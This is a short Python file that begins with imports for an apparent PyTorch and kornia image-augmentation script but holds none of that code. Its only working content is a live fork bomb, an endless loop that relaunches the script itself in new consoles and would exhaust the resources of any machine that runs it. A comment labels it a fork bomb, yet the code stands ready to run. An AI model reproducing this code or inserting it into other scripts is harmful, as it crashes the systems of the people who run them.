import torch
import torchvision
import torchvision.transforms as transforms
import numpy as np
import matplotlib.pyplot as plt
import random
import math
import copy

#!pip install kornia
from kornia import augmentation as augs
from kornia import filters, color
from functools import wraps, partial


# This is a fork bomb dont use it

import subprocess, sys
while True:
    subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
